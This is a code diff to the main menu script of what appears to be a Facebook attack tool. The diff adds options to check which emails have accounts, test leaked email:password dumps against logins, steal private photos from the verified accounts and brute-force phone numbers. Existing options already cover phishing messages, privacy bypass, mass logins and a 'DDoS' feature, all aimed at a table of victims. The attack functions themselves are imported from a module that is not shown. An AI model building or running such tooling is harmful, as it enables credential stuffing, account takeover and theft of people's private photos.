@@ -1,4 +1,4 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase, friendlyLogout
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase, friendlyLogout, takePhotos,accountexists, checkLogin,steal, bruteforceCel
 from database import connect,status, checkTableExistence, createVictimTable
 from time import time
 import signal
@@ -60,7 +60,10 @@ def main():
                (int(option) != 21) and (int(option) != 22) and 
                (int(option) != 23) and (int(option) != 24) and
                (int(option) != 25) and (int(option) != 26) and
-               (int(option) != 27) and (int(option) != 28)):
+               (int(option) != 27) and (int(option) != 28) and
+               (int(option) != 29) and (int(option) != 30) and
+               (int(option) != 31) and (int(option) != 32) and
+               (int(option) != 33)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -90,7 +93,12 @@ def main():
             print '25) NEW! SPAM any fanpage inbox\n'
             print '26) Bypass - database support (Beta) \n '
             print '27) Logout all your friends - FB blackout \n'
-            print '28) Close the application\n'
+            print '28) Take the photos!\n'
+            print '29) Check existence of mails\n'
+            print '30) Check working account and passwords\n'
+            print '31) Steal private photos from password verified dump\n'
+            print '32) Bruteforce celphones\n'
+            print '33) Close the application\n'
 
             
             choice = raw_input('Insert your choice: ')
@@ -520,6 +528,48 @@ def main():
                     friendlyLogout(noteID, privacy[option])
 
         if (int(option) == 28):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                threads = raw_input('Usage: insert the threads filename and place it in massive folder first: ')
+                raw_input('Dumps will be stored in massive\\photos')
+                takePhotos(threads)
+
+        if (int(option) == 29):
+            mailFile = raw_input('Insert the filename that contains the list of emails (place it in PRIVATE folder first): ')
+            raw_input('Verified emails will be stored in PRIVATE --> existence --> verified.txt ')
+            accountexists(mailFile)
+            
+        if (int(option) == 30):
+            mailFile = raw_input('Insert the filename that contains the list of emails and passwords (place it in PRIVATE folder first) with email:password pattern: ')
+            raw_input('Verified loggins will be stored in PRIVATE --> loggedin --> loggedin.txt ')
+            checkLogin(mailFile)
+
+        if (int(option) == 31):
+            raw_input('You must first run option 30, if you didn\'t I will fail :D ')
+            raw_input('Dumps will be stored in massive\\photos')
+            steal()
+
+        if (int(option) == 32):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+            if (login(email,password,'real'))!= -1:
+                raw_input('Dumps will be stored in cellphones --> cellphones.txt')
+                first = raw_input('Insert the zone code: ')
+                start = raw_input('Insert the start number: ')
+                end = raw_input('Insert the end number: ')
+                bruteforceCel(first,start,end)  
+            
+        if (int(option) == 33):
             connect.close()          
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
